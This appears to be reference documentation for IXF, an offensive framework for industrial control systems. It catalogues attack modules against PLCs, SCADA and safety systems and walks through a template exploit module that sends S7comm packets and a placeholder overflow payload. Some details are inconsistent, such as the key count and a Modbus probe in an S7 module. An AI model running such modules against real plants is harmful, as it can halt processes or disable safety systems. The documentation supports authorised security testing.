# Module System

This document is the definitive reference for the IXF module architecture. It covers every aspect of writing, loading, and running modules: path conventions, category taxonomy, module anatomy, all 13 `__info__` keys, all 10 option types with complete validation rules, decorators, method patterns, metaclass internals, and the full discovery API.

---

## Table of Contents

1. [Module Path Conventions](#module-path-conventions)
2. [Module Categories](#module-categories)
3. [Module Anatomy](#module-anatomy)
4. [`__info__` Dictionary Reference](#__info__-dictionary-reference)
5. [Option Types](#option-types)
   - [OptIP](#optip)
   - [OptPort](#optport)
   - [OptInteger](#optinteger)
   - [OptFloat](#optfloat)
   - [OptString](#optstring)
   - [OptBool](#optbool)
   - [OptMAC](#optmac)
   - [OptWordlist](#optwordlist)
   - [OptEncoder](#optencoder)
   - [Advanced Options](#advanced-options)
6. [Decorators](#decorators)
   - [@mute](#mute)
   - [@multi](#multi)
7. [Method Patterns](#method-patterns)
   - [check()](#check-method-pattern)
   - [run()](#run-method-pattern)
8. [`get_info()` Method](#get_info-method)
9. [Protocol Enum](#protocol-enum)
10. [Metaclass: ExploitOptionsAggregator](#metaclass-exploitoptionsaggregator)
11. [Discovery API](#discovery-api)
    - [import_exploit()](#import_exploit)
    - [index_modules()](#index_modules)
12. [Module Validation Command](#module-validation-command)
13. [Complete Module Example](#complete-module-example)

---

## Module Path Conventions

Modules live under `industrialxpl/modules/` and are referenced by their path relative to that directory. IXF accepts two equivalent notations everywhere a module path is expected.

### Slash notation (shell display)

Used in the interactive shell for `use`, `search`, `info`, and `show` commands. Visually resembles a filesystem path.

```
scanners/ics/modbus_detect
scanners/ics/s7_enumerate
scanners/osint/shodan_ics_dork
creds/siemens/s7_default_creds
creds/rockwell/logix_default_creds
exploits/protocols/modbus/modbus_fc90_dos
exploits/protocols/dnp3/dnp3_unsolicit_flood
exploits/protocols/s7/s7_stop_cpu
exploits/protocols/enip/enip_list_identity
exploits/protocols/bacnet/bacnet_who_is_flood
exploits/plc/siemens/s7_1200_hardcoded_key
exploits/plc/rockwell/logix5000_urdf_dos
exploits/scada/ignition/ignition_rce
exploits/mes/sap/sap_message_server_dos
cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
cve/siemens/cve_2019_13945_simatic_s7_dos
cve/rockwell/cve_2022_1159_logix5000_heap_overflow
cve/schneider/cve_2018_7789_modicon_rce
cve/apt/sandworm_industroyer_iec104
cve/apt/triton_triconex_safety_overwrite
cve/malware/crashoverride_industroyer
cve/malware/frostygoop_modbus_heating
cve/malware/pipedream_iocontrol
assessment/mitre_ics/t0801_monitor_process_state
assessment/mitre_ics/t0843_program_upload
assessment/mitre_ics/coverage_report
assessment/mitre_ics/full_mitre_sweep
assessment/iec62443/zone_conduit_audit
assessment/sast/plc_code_llm_review
assessment/risk/ics_risk_score
assessment/ir/iacs_ir_playbook
```

### Dot notation (Python import path)

Equivalent to the slash notation with `.` as separator. Used in programmatic contexts (`import_exploit`, `index_modules`), Python scripts, and some shell commands internally.

```
scanners.ics.modbus_detect
scanners.ics.s7_enumerate
creds.siemens.s7_default_creds
exploits.protocols.modbus.modbus_fc90_dos
exploits.plc.siemens.s7_1200_hardcoded_key
cve.siemens.cve_2021_22681_s7_1200_hardcoded_key
cve.malware.crashoverride_industroyer
assessment.mitre_ics.t0801_monitor_process_state
assessment.iec62443.zone_conduit_audit
```

Both notations are fully interchangeable in the shell. The `use` command normalizes slashes to dots internally via `pythonize_path()`, and converts dots back to slashes via `humanize_path()` for display.

### Path construction rules

| Rule | Example |
|------|---------|
| All lowercase | `cve/siemens/cve_2021_22681_...` |
| Underscores for word boundaries | `modbus_detect`, not `modbus-detect` |
| CVE paths include the full CVE ID | `cve_2021_22681_s7_1200_hardcoded_key` |
| MITRE technique modules prefixed `tNNNN_` | `t0801_monitor_process_state` |
| Vendor-specific grouped under vendor folder | `cve/siemens/`, `creds/rockwell/` |
| File name matches module class purpose | `modbus_detect.py` defines detection logic |

### Prefix to full import path

When calling `import_exploit()` or building absolute import paths, prepend `industrialxpl.modules.`:

```python
# Shell slash notation        -> Python absolute import path
"cve/siemens/cve_2021_22681"  -> "industrialxpl.modules.cve.siemens.cve_2021_22681"
"scanners/ics/modbus_detect"  -> "industrialxpl.modules.scanners.ics.modbus_detect"
```

---

## Module Categories

The module tree is organized by function and attack surface. The table below shows every top-level directory and its sub-categories, with example paths and descriptions.

### `exploits/protocols/`

Protocol design abuse modules. These exploit weaknesses baked into industrial protocol specifications, not vendor software bugs.

| Sub-category | Example path | Description |
|---|---|---|
| `modbus/` | `exploits/protocols/modbus/modbus_fc90_dos` | Modbus function code abuse (FC3, FC6, FC16, FC90) |
| `dnp3/` | `exploits/protocols/dnp3/dnp3_unsolicit_flood` | DNP3 unsolicited response flood |
| `s7/` | `exploits/protocols/s7/s7_stop_cpu` | S7comm CPU stop via PDU |
| `enip/` | `exploits/protocols/enip/enip_list_identity` | EtherNet/IP identity scan / CIP command injection |
| `bacnet/` | `exploits/protocols/bacnet/bacnet_who_is_flood` | BACnet Who-Is broadcast flood |
| `iec104/` | `exploits/protocols/iec104/iec104_startdt_flood` | IEC 60870-5-104 STARTDT/TESTFR abuse |
| `opcua/` | `exploits/protocols/opcua/opcua_browse_leak` | OPC UA unauthenticated browse tree leak |
| `profinet/` | `exploits/protocols/profinet/profinet_dcp_flood` | PROFINET DCP multicast flood |

### `exploits/plc/`

Vendor-specific PLC exploits. Target firmware, bootloaders, and proprietary protocol extensions.

| Sub-category | Example path | Description |
|---|---|---|
| `siemens/` | `exploits/plc/siemens/s7_1200_hardcoded_key` | S7-1200/1500 hardcoded crypto key |
| `rockwell/` | `exploits/plc/rockwell/logix5000_urdf_dos` | ControlLogix 5000 unrecognized frame DoS |
| `schneider/` | `exploits/plc/schneider/modicon_m340_auth_bypass` | Modicon M340 unauthenticated session |
| `ge/` | `exploits/plc/ge/srtp_ge_rx3i_dos` | GE SRTP protocol DoS on RX3i |
| `mitsubishi/` | `exploits/plc/mitsubishi/melsec_melsecnet_rce` | MELSEC-Q series remote code execution |

### `exploits/scada/`

SCADA/HMI software exploits. Target historian servers, HMI applications, and SCADA web interfaces.

| Sub-category | Example path | Description |
|---|---|---|
| `ignition/` | `exploits/scada/ignition/ignition_rce` | Inductive Automation Ignition RCE |
| `wonderware/` | `exploits/scada/wonderware/archestra_dcom_exec` | Wonderware ArchestrA DCOM execution |
| `ge_cimplicity/` | `exploits/scada/ge_cimplicity/cimplicity_path_traversal` | GE Cimplicity path traversal |
| `kepware/` | `exploits/scada/kepware/kepserverex_buffer_overflow` | KEPServerEX OPC DA buffer overflow |

### `exploits/mes/`

MES/ERP level exploits targeting manufacturing execution systems and enterprise integrations.

| Sub-category | Example path | Description |
|---|---|---|
| `ignition/` | `exploits/mes/ignition/ignition_gateway_rce` | Ignition Gateway RCE via deserialization |
| `sap/` | `exploits/mes/sap/sap_message_server_dos` | SAP Message Server DoS (CVE-2020-6287 class) |
| `activemq/` | `exploits/mes/activemq/activemq_rce` | Apache ActiveMQ RCE (CVE-2023-46604 class) |

### `scanners/ics/`

Protocol-specific discovery and fingerprinting. Read-only modules for asset inventory.

| Example path | Description |
|---|---|
| `scanners/ics/modbus_detect` | Modbus TCP port probe and unit ID enumeration |
| `scanners/ics/s7_enumerate` | S7comm CPU info, firmware version, protection level |
| `scanners/ics/enip_list_identity` | EtherNet/IP List Identity broadcast |
| `scanners/ics/bacnet_device_id` | BACnet Read Property — device ID and vendor name |
| `scanners/ics/dnp3_link_status` | DNP3 Link Status request |
| `scanners/ics/opcua_endpoints` | OPC UA unauthenticated endpoint enumeration |
| `scanners/ics/profinet_dcp_identify` | PROFINET DCP device identification |
| `scanners/ics/iec104_connect` | IEC 60870-5-104 STARTDT connection test |

### `scanners/osint/`

Open-source intelligence modules using external data sources.

| Example path | Description |
|---|---|
| `scanners/osint/shodan_ics_dork` | Shodan dorks for ICS/SCADA systems (requires API key) |
| `scanners/osint/elitewolf_signatures` | NSA ELITEWOLF ICS detection signatures |
| `scanners/osint/censys_ics_hunt` | Censys ICS device search |
| `scanners/osint/ot_cvss_feed` | OT-specific CVE feed pull and triage |

### `creds/`

Default credential testing modules organized by vendor.

| Example path | Description |
|---|---|
| `creds/siemens/s7_default_creds` | Siemens S7 password brute-force |
| `creds/rockwell/logix_default_creds` | Rockwell Allen-Bradley ControlLogix default creds |
| `creds/schneider/modicon_default_creds` | Schneider Modicon default credential test |
| `creds/ge/ge_rx3i_default_creds` | GE PACSystems RX3i default password test |
| `creds/mitsubishi/melsec_default_creds` | Mitsubishi MELSEC default credential spray |
| `creds/generic/modbus_coil_write_test` | Generic write-access test via Modbus FC6 |

### `cve/`

CVE-specific PoC exploit modules. Each module implements the PoC for one CVE.

| Sub-category | Description |
|---|---|
| `cve/siemens/` | Siemens product CVEs (S7-1200, S7-1500, WinCC, SIMATIC) |
| `cve/rockwell/` | Rockwell Automation / Allen-Bradley CVEs |
| `cve/schneider/` | Schneider Electric CVEs (Modicon, EcoStruxure) |
| `cve/ge/` | General Electric automation CVEs |
| `cve/mitsubishi/` | Mitsubishi Electric automation CVEs |
| `cve/honeywell/` | Honeywell DCS and safety controller CVEs |
| `cve/emerson/` | Emerson DeltaV and Fisher CVEs |

### `cve/apt/` and `cve/malware/`

APT and malware TTP simulation modules. These replicate the Tactics, Techniques, and Procedures of real ICS-targeted attack campaigns.

| Example path | Description |
|---|---|
| `cve/apt/sandworm_industroyer_iec104` | Industroyer/Crashoverride IEC 104 payload (Sandworm/Ukraine 2016) |
| `cve/apt/triton_triconex_safety_overwrite` | TRITON/TRISIS safety system overwrite (Schneider Triconex, Saudi Arabia 2017) |
| `cve/apt/lazarus_ecipekac_plc` | Lazarus Group PLC implant TTP simulation |
| `cve/malware/crashoverride_industroyer` | Crashoverride/Industroyer complete TTP replay |
| `cve/malware/frostygoop_modbus_heating` | FrostyGoop Modbus heating attack (GRU/Ukraine 2024) |
| `cve/malware/pipedream_iocontrol` | PIPEDREAM/INCONTROLLER OT framework simulation |
| `cve/malware/blackenergy_datalogger` | BlackEnergy SCADA data exfiltration TTP |

### `cve/malware/_native/`

Native code implementations of ICS malware components in C, C++, Go, or Python. This directory is excluded from `index_modules()` results by default (listed in `DISABLED_DOMAINS`). Contents are compiled payloads, not loadable IXF modules.

### `assessment/mitre_ics/`

MITRE ATT&CK for ICS technique modules. Each module maps to one or more MITRE ICS technique IDs. The naming convention is `tNNNN_<technique_name>.py`.

| Example path | MITRE ID | Description |
|---|---|---|
| `assessment/mitre_ics/t0801_monitor_process_state` | T0801 | Monitor process state via Modbus read |
| `assessment/mitre_ics/t0806_brute_force_io` | T0806 | Brute-force I/O module by exhaustive write |
| `assessment/mitre_ics/t0835_manipulate_io_image` | T0835 | Modify I/O image in PLC memory |
| `assessment/mitre_ics/t0836_modify_parameter` | T0836 | Write process parameter via FC16 |
| `assessment/mitre_ics/t0843_program_upload` | T0843 | Upload PLC ladder logic program |
| `assessment/mitre_ics/t0845_program_upload` | T0845 | PLC logic program download/overwrite |
| `assessment/mitre_ics/t0848_rogue_master` | T0848 | Rogue Modbus master injection |
| `assessment/mitre_ics/t0851_rootkit` | T0851 | PLC rootkit implant simulation |
| `assessment/mitre_ics/coverage_report` | All | Generate ATT&CK Navigator layer JSON |
| `assessment/mitre_ics/full_mitre_sweep` | All | Execute all technique modules against target |

### `assessment/iec62443/`

IEC 62443 compliance check modules.

| Example path | Description |
|---|---|
| `assessment/iec62443/zone_conduit_audit` | IEC 62443-3-2 Zone and Conduit security audit questionnaire |
| `assessment/iec62443/sl_gap_analysis` | Security Level gap analysis (SL-C vs SL-T) |
| `assessment/iec62443/patch_management_check` | IEC 62443-2-3 patch management practice review |

### `assessment/sast/`

Static analysis and LLM-assisted PLC code review.

| Example path | Description |
|---|---|
| `assessment/sast/plc_code_llm_review` | LLM-assisted ladder logic and structured text review |
| `assessment/sast/iec61131_lint` | IEC 61131-3 code lint for unsafe patterns |

### `assessment/risk/`

Risk scoring modules that produce quantitative OT risk metrics.

| Example path | Description |
|---|---|
| `assessment/risk/ics_risk_score` | Composite OT risk score (CVSS + Purdue level + exposure) |

### `assessment/ir/`

Incident response playbook modules.

| Example path | Description |
|---|---|
| `assessment/ir/iacs_ir_playbook` | Interactive IEC 62443-2-1 / NIST SP 800-61r3 IACS IR checklist |

---

## Module Anatomy

Every module is a single Python file containing a class named `Exploit` (or `Scanner` or `Assessment`) that inherits from the imported `Exploit` base. The class name shadows the import, which is intentional and required by the IXF loader.

Below is a complete, fully-annotated module skeleton showing every element:

```python
"""One-line module description used in help text.

Extended description goes here. Keep the module docstring factual:
what protocol or CVE is targeted, what the exploit does, and what
the expected outcome is.
"""

# Standard library imports first
import socket
import struct
from typing import Optional

# IXF imports second
from industrialxpl.core.exploit import (
    # Base class — your class must shadow this name
    Exploit,
    # Option descriptors — declare as class-level attributes
    OptBool,
    OptIP,
    OptInteger,
    OptPort,
    OptString,
    # Decorators
    mute,
    multi,
    # Printer functions
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
    # Safety gate
    DestructiveGate,
)


class Exploit(Exploit):
    # ── Metadata dictionary ──────────────────────────────────────────────────
    # The metaclass renames this to _Exploit__info__ to survive inheritance.
    # Always use the literal name __info__ in the class body.
    __info__ = {
        # Required: human-readable name shown in show info / search results
        "name":             "CVE-YYYY-NNNNN Vendor Product Model",

        # Required: 1-3 sentence description of what this module does
        "description":      (
            "Exploits a stack buffer overflow in the Vendor Product Model "
            "firmware update handler. Achieves unauthenticated remote code "
            "execution as root on the target PLC."
        ),

        # Required: tuple of author strings (use tuple even for one author)
        "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),

        # Required: tuple of advisory/PoC URLs, papers, or standards references
        "references":       (
            "https://www.cisa.gov/ics-advisories/ICSA-YY-NNN-NN",
            "https://nvd.nist.gov/vuln/detail/CVE-YYYY-NNNNN",
            "https://github.com/author/poc-cve-yyyy-nnnnn",
        ),

        # Required: tuple of affected devices / software / firmware versions
        "devices":          (
            "Vendor Product Model v1.0 - v2.3",
            "Vendor Product Model v3.0 (firmware < 3.1.4)",
        ),

        # Required: impact level — determines DestructiveGate confirmation tier
        # Valid values: INFO | READ | LOW | MEDIUM | HIGH | CRITICAL | CATASTROPHIC
        "impact":           "CRITICAL",

        # Required: short category label for search/filter display
        # Examples: "Stack Buffer Overflow", "Default Credentials",
        #           "Denial of Service", "Authentication Bypass",
        #           "Protocol Abuse", "MITRE ATT&CK for ICS Technique"
        "exploit_type":     "Stack Buffer Overflow",

        # Optional: URL of the original PoC this module is based on
        "source_poc":       "https://github.com/example/cve-yyyy-nnnnn-poc",

        # Required: CVE ID string, or "N/A" if no CVE exists
        "cve":              "CVE-YYYY-NNNNN",

        # Required: CVSS base score string, or "N/A"
        "cvss":             "9.8",

        # Required: severity label — typically mirrors the CVSS severity
        # Values: INFO | LOW | MEDIUM | HIGH | CRITICAL
        "severity":         "CRITICAL",

        # Required: list of MITRE ATT&CK for ICS technique IDs
        # Use ICS-specific IDs (T08xx), not Enterprise (T1xxx)
        "mitre_techniques": ["T0866", "T0821"],

        # Required: list of MITRE ATT&CK for ICS tactic names
        # Must use exact tactic names from the ICS matrix
        "mitre_tactics":    ["Lateral Movement", "Inhibit Response Function"],

        # Optional: text shown in DestructiveGate banner Description field
        # If omitted, the module description is used instead
        "destructive_description": (
            "Sends a malformed firmware update PDU that triggers a stack "
            "buffer overflow in the target PLC's update service, enabling "
            "arbitrary code execution in the firmware context."
        ),
    }

    # ── Option declarations ──────────────────────────────────────────────────
    # Class-level Option descriptors. The metaclass collects these into
    # exploit_attributes for tab-completion and show options display.

    # Target host — always OptIP, always defaults to empty string
    target      = OptIP("",    "Target device IP or hostname")

    # Protocol port — use the standard port for the target protocol
    port        = OptPort(102,  "S7comm port (default: 102)")

    # Example integer option with bounds
    timeout     = OptInteger(5, "Connection timeout (seconds)", min_value=1, max_value=60)
    slot        = OptInteger(2, "PLC rack/slot number", min_value=0, max_value=31)

    # SafeMode — MUST be declared in every module. Default MUST be True.
    simulate    = OptBool(True,  "Simulate mode: describe action without sending payload")

    # DestructiveMode — MUST be declared in every module. Default MUST be False.
    destructive = OptBool(False, "Enable live exploitation — may cause irreversible damage")

    # ── check() method ───────────────────────────────────────────────────────
    @mute  # Always decorate check() with @mute for thread-safe scanning
    def check(self) -> bool:
        """Read-only connectivity probe — never sends exploit payloads.

        Returns True if the target appears reachable and potentially vulnerable.
        Returns False on any error, unreachable target, or safe response.
        """
        if not self.target:
            return False
        try:
            s = socket.socket()
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            # Optional: send a benign probe to confirm the service
            # Modbus PDU: Transaction=1, Protocol=0, Length=6, Unit=1,
            #             FC3, Start=0, Count=1
            probe = b"\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01"
            s.send(probe)
            response = s.recv(64)
            s.close()
            # Minimal Modbus response: transaction ID (2) + protocol (2) +
            # length (2) + unit (1) + FC (1) = 8 bytes minimum
            return len(response) >= 8
        except Exception:
            return False

    # ── run() method ─────────────────────────────────────────────────────────
    def run(self) -> None:
        """Execute the exploit or describe what would happen in simulate mode."""
        # Step 1: Always validate required options first
        if not self.target:
            print_error("Set 'target' option first. Example: set target 192.168.1.100")
            return

        # Step 2: Simulate path — no packets sent to the target
        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-YYYY-NNNNN Vendor Product Model — Stack Buffer Overflow\n\n"
                    "Step 1: Connect to {}:{} (S7comm)\n"
                    "Step 2: Send malformed firmware update PDU (0x72 function)\n"
                    "Step 3: Overwrite return address with shellcode pointer\n"
                    "Step 4: Shellcode spawns reverse shell on port 4444\n"
                    "Physical Impact: PLC crash or arbitrary code execution in "
                    "firmware context — may stop controlled process"
                ).format(self.target, self.port),
                payload_hex=(
                    "03 00 00 XX 02 F0 80 72 01 00 00 00 00 00 "
                    "90 90 90 90 <shellcode>"
                ),
                payload_human=(
                    "S7comm firmware update PDU with overlong 'update_data' "
                    "field (>512 bytes) targeting strcpy() in update handler"
                ),
                mitre_techniques=["T0866", "T0821"],
            )
            return

        # Step 3: Live exploit path
        # This branch executes only when simulate=False AND destructive=True
        # AND the DestructiveGate confirmation was accepted.
        print_status(
            "[CVE-YYYY-NNNNN] Connecting to {}:{} (slot {})...".format(
                self.target, self.port, self.slot
            )
        )
        try:
            s = socket.socket()
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))

            # Send TPKT/COTP connection request
            cotp_cr = bytes.fromhex("0300001611e00000001400c1020100c2020102c0010a")
            s.send(cotp_cr)
            resp = s.recv(32)

            if len(resp) < 7:
                print_error("Unexpected COTP response — target may not be vulnerable.")
                return

            # Send S7comm setup communication
            s7_setup = bytes.fromhex(
                "0300001902f08032010000000000080000f0000001000101f0"
            )
            s.send(s7_setup)
            resp = s.recv(32)

            # Send malformed firmware update PDU
            payload = b"\x90" * 512 + b"\x41\x41\x41\x41"  # placeholder shellcode
            pdu = struct.pack(">HHHBB", 1, 0, len(payload) + 2, 1, 0x72) + payload
            s.send(pdu)
            s.close()

            print_success(
                "[CVE-YYYY-NNNNN] Payload delivered to {}:{}".format(
                    self.target, self.port
                )
            )
        except ConnectionRefusedError:
            print_error("Connection refused — port {} may be closed.".format(self.port))
        except socket.timeout:
            print_error("Connection timed out after {}s.".format(self.timeout))
        except Exception as exc:
            print_error("Unexpected error: {}".format(exc))
```

---

## `__info__` Dictionary Reference

Every module class body must contain a `__info__` dictionary. The `ExploitOptionsAggregator` metaclass intercepts this key and stores it under `_{ClassName}__info__` to survive Python's multiple-inheritance name mangling. You always write it as `__info__` in the class body; the metaclass handles the rest.

The table below documents all 14 valid keys.

| Key | Type | Required | Valid Values | Description |
|-----|------|----------|-------------|-------------|
| `name` | `str` | Yes | Any string | Human-readable module name. Shown in `show info`, `search`, and the prompt banner. Example: `"CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Key"` |
| `description` | `str` | Yes | Any string | One to three sentences describing the vulnerability and what the module does. Avoid marketing language. |
| `authors` | `tuple[str]` | Yes | Tuple of strings | Author(s) of this module. Must be a `tuple`, not a `list`. Single author: `("Name",)` — note the trailing comma. |
| `references` | `tuple[str]` | Yes | Tuple of URL strings | Advisory URLs, PoC repositories, vendor security bulletins, academic papers, or standards references. |
| `devices` | `tuple[str]` | Yes | Tuple of strings | Affected devices or software, including version range when known. Example: `("Siemens S7-1200 v1.0-v4.1", "Siemens S7-1500 v1.0-v2.8")` |
| `impact` | `str` | Yes | `INFO`, `READ`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL`, `CATASTROPHIC` | Determines the DestructiveGate confirmation tier. See Impact Levels below. |
| `exploit_type` | `str` | Yes | Any short label | Short category for search and filtering. Common values: `"Stack Buffer Overflow"`, `"Heap Overflow"`, `"Authentication Bypass"`, `"Default Credentials"`, `"Denial of Service"`, `"Protocol Abuse"`, `"Remote Code Execution"`, `"Information Disclosure"`, `"Safety Bypass"`, `"MITRE ATT&CK for ICS Technique"`, `"Coverage Assessment"`, `"Compliance Audit"` |
| `source_poc` | `str` | No | URL string or `"IXF native"` | URL of the original public PoC this module was written from. Use `"IXF native"` for modules with no external PoC. Omit the key entirely if not applicable. |
| `cve` | `str` | Yes | `"CVE-YYYY-NNNNN"` or `"N/A"` | CVE identifier. Use `"N/A"` for zero-days, technique modules, or compliance checks without a CVE. |
| `cvss` | `str` | Yes | `"0.0"` to `"10.0"` or `"N/A"` | CVSS v3.1 base score as a string. Use `"N/A"` if not applicable. |
| `severity` | `str` | Yes | `INFO`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` or `"N/A"` | Severity label. Typically the CVSS severity tier corresponding to the score. |
| `mitre_techniques` | `list[str]` | Yes | List of ICS technique IDs | MITRE ATT&CK for ICS technique IDs. Use ICS matrix IDs (`T08xx`), not Enterprise (`T1xxx`). Use `[]` for assessment or passive modules with no specific mapping. |
| `mitre_tactics` | `list[str]` | Yes | List of ICS tactic names | MITRE ATT&CK for ICS tactic names. Must match the exact tactic names from the ICS matrix (e.g., `"Collection"`, `"Lateral Movement"`, `"Inhibit Response Function"`, `"Impair Process Control"`, `"Impact"`). |
| `destructive_description` | `str` | No | Any string (max ~72 chars for banner) | Optional text shown in the DestructiveGate banner's "Description" field. If omitted, the module `description` is used. Keep to one line for clean banner display. |

### Impact levels - complete specification

The `impact` key determines how much confirmation IXF requires before allowing live execution. The exact description strings come from `safety.py:IMPACT_LEVELS`.

| Level | Exact Description String (from code) | When It Applies | Confirmation Required | Example Modules |
|-------|---------------------------------------|----------------|----------------------|-----------------|
| `INFO` | `"Passive observation only. No packets sent."` | Modules that never touch the network. Assessment tools, compliance checklists, coverage reports, documentation generators. | Automatic — no prompt | `assessment/mitre_ics/coverage_report`, `assessment/ir/iacs_ir_playbook` |
| `READ` | `"Read-only queries. No state change on target."` | Modules that read data from the target but never write or modify anything. Protocol scanners, banner grabbers, register readers. | Automatic — no prompt | `scanners/ics/modbus_detect`, `scanners/ics/s7_enumerate`, `assessment/mitre_ics/t0801_monitor_process_state` |
| `LOW` | `"Non-destructive write. Reversible."` | Modules that write non-critical data. LED toggle, test coil write, non-production tag update. The change is easily reversed. | Warning displayed, no confirmation required | `exploits/protocols/modbus/modbus_single_coil_write`, `assessment/mitre_ics/t0835_manipulate_io_image` |
| `MEDIUM` | `"Process parameter modification. May affect operation. Reversible."` | Modules that change process parameters (setpoints, timers, counters). The change may affect the running process but can be reversed by an operator. | Press Enter to confirm | `exploits/protocols/modbus/modbus_fc16_write_registers`, `assessment/mitre_ics/t0836_modify_parameter` |
| `HIGH` | `"Device restart / process stop. Requires operator intervention."` | Modules that stop a PLC CPU, trigger a device restart, or halt a controlled process. Recovery requires physical or remote operator action. | Type exact confirmation string | `exploits/protocols/s7/s7_stop_cpu`, `creds/siemens/s7_default_creds`, `assessment/mitre_ics/t0806_brute_force_io` |
| `CRITICAL` | `"Firmware modification / safety bypass / PLC logic overwrite. MAY BE IRREVERSIBLE."` | Modules that modify firmware, overwrite PLC logic programs, or bypass safety interlocks. Damage may be permanent or require factory reset. | Type exact confirmation string | `cve/siemens/cve_2021_22681_s7_1200_hardcoded_key`, `exploits/plc/siemens/s7_1200_hardcoded_key`, `assessment/mitre_ics/t0845_program_upload` |
| `CATASTROPHIC` | `"Physical equipment damage / safety system disabling. IRREVERSIBLE."` | Modules that can damage physical equipment, disable safety systems (SIS/SIS bypass), or cause conditions that could harm personnel. The highest tier. | Type exact confirmation string + mandatory 10-second countdown | `cve/malware/frostygoop_modbus_heating`, `cve/apt/triton_triconex_safety_overwrite`, `cve/malware/crashoverride_industroyer` |

---

## Option Types

Modules declare options as class-level descriptors. The `ExploitOptionsAggregator` metaclass collects them into `exploit_attributes` for tab-completion, `show options`, and `show advanced` display. On every `set` command the shell calls the descriptor's `validate()` method; on failure an `OptionValidationError` is raised and the value is not changed.

All option constructors share this base signature inherited from `Option`:

```python
Option(default: Any, description: str, *, advanced: bool = False)
```

The `advanced=True` keyword hides the option from `show options` and shows it only in `show advanced`.

---

### `OptIP`

**File:** `industrialxpl/core/exploit/option.py`

Accepts an IPv4 address (validated via `ipaddress.ip_address`) or a hostname (validated as alphanumeric with `-`, `_`, `.` characters only). An empty string is always valid and means "unset".

**Constructor:**
```python
OptIP(default: str, description: str, *, advanced: bool = False)
```

**Validation logic:**
1. Strip whitespace from input.
2. If empty string, accept immediately.
3. Try `ipaddress.ip_address(value)` — accepts any valid IPv4 or IPv6 address.
4. If that fails, check that every character is alphanumeric or in `{'-', '_', '.'}` — accepts hostnames and FQDN.
5. If step 4 also fails, raise `OptionValidationError`.

**Valid inputs:**

| Input | Accepted? | Notes |
|-------|-----------|-------|
| `"192.168.1.100"` | Yes | Valid IPv4 |
| `"10.0.0.1"` | Yes | Valid IPv4 |
| `"172.16.254.1"` | Yes | Valid IPv4 |
| `"::1"` | Yes | IPv6 loopback |
| `"2001:db8::1"` | Yes | Valid IPv6 |
| `"plc-01.factory.local"` | Yes | Valid FQDN |
| `"target_host"` | Yes | Alphanumeric with underscore |
| `"plc-siemens"` | Yes | Hyphen is allowed |
| `""` | Yes | Empty = unset |

**Invalid inputs:**

| Input | Error message |
|-------|--------------|
| `"999.999.999.999"` | `'999.999.999.999' is not a valid IP address or hostname.` |
| `"not a hostname!"` | `'not a hostname!' is not a valid IP address or hostname.` |
| `"192.168.1.100:502"` | `'192.168.1.100:502' is not a valid IP address or hostname.` |
| `"target/host"` | `'target/host' is not a valid IP address or hostname.` |
| `"host name"` | `'host name' is not a valid IP address or hostname.` |

**Declaration example:**
```python
target = OptIP("", "Target device IP or hostname")
```

**Terminal session:**
```
ixf (CVE-2021-22681 S7-1200) > set target 192.168.1.100
[*] target => 192.168.1.100

ixf (CVE-2021-22681 S7-1200) > set target plc-01.factory.local
[*] target => plc-01.factory.local

ixf (CVE-2021-22681 S7-1200) > set target 192.168.1.100:502
[-] Validation error for 'target': '192.168.1.100:502' is not a valid IP address or hostname.

ixf (CVE-2021-22681 S7-1200) > set target not_a_hostname!
[-] Validation error for 'target': 'not_a_hostname!' is not a valid IP address or hostname.

ixf (CVE-2021-22681 S7-1200) > set target ""
[*] target => 
```

---

### `OptPort`

**File:** `industrialxpl/core/exploit/option.py`

Accepts a TCP or UDP port number. Internally always stored as `int`. String inputs are converted with `int()`.

**Constructor:**
```python
OptPort(default: int, description: str, *, advanced: bool = False)
```

**Validation logic:**
1. Try `int(value)` — accepts any integer-coercible input including string `"502"`.
2. If conversion fails, raise `OptionValidationError`.
3. Check `1 <= port <= 65535`. If outside range, raise `OptionValidationError`.

**Valid inputs:**

| Input | Stored as | Notes |
|-------|-----------|-------|
| `502` | `502` | Modbus TCP default |
| `44818` | `44818` | EtherNet/IP default |
| `102` | `102` | S7comm / TSAP default |
| `20000` | `20000` | DNP3 default |
| `47808` | `47808` | BACnet/IP default |
| `4840` | `4840` | OPC UA default |
| `65535` | `65535` | Maximum valid port |
| `1` | `1` | Minimum valid port |
| `"80"` | `80` | String auto-converted to int |
| `"44818"` | `44818` | String auto-converted to int |

**Invalid inputs:**

| Input | Error message |
|-------|--------------|
| `0` | `Port must be in range 1-65535, got: 0` |
| `65536` | `Port must be in range 1-65535, got: 65536` |
| `-1` | `Port must be in range 1-65535, got: -1` |
| `"abc"` | `Port must be an integer, got: 'abc'` |
| `"502.5"` | `Port must be an integer, got: '502.5'` |

**Common default ports by protocol:**

| Protocol | Default Port | Declaration |
|----------|-------------|-------------|
| Modbus TCP | 502 | `port = OptPort(502, "Modbus TCP port")` |
| S7comm / TSAP | 102 | `port = OptPort(102, "S7comm port")` |
| EtherNet/IP | 44818 | `port = OptPort(44818, "EtherNet/IP port")` |
| DNP3 | 20000 | `port = OptPort(20000, "DNP3 port")` |
| BACnet/IP | 47808 | `port = OptPort(47808, "BACnet/IP port")` |
| OPC UA | 4840 | `port = OptPort(4840, "OPC UA port")` |
| IEC 60870-5-104 | 2404 | `port = OptPort(2404, "IEC 104 port")` |

**Terminal session:**
```
ixf (Modbus FC90 DoS) > set port 502
[*] port => 502

ixf (Modbus FC90 DoS) > set port 65535
[*] port => 65535

ixf (Modbus FC90 DoS) > set port 0
[-] Validation error for 'port': Port must be in range 1-65535, got: 0

ixf (Modbus FC90 DoS) > set port 65536
[-] Validation error for 'port': Port must be in range 1-65535, got: 65536

ixf (Modbus FC90 DoS) > set port tcp
[-] Validation error for 'port': Port must be an integer, got: 'tcp'
```

---

### `OptInteger`

**File:** `industrialxpl/core/exploit/option.py`

Accepts any integer. Optional `min_value` and `max_value` keyword arguments add inclusive bounds checking.

**Constructor:**
```python
OptInteger(
    default: int,
    description: str,
    *,
    min_value: Optional[int] = None,
    max_value: Optional[int] = None,
    advanced: bool = False,
)
```

**Validation logic:**
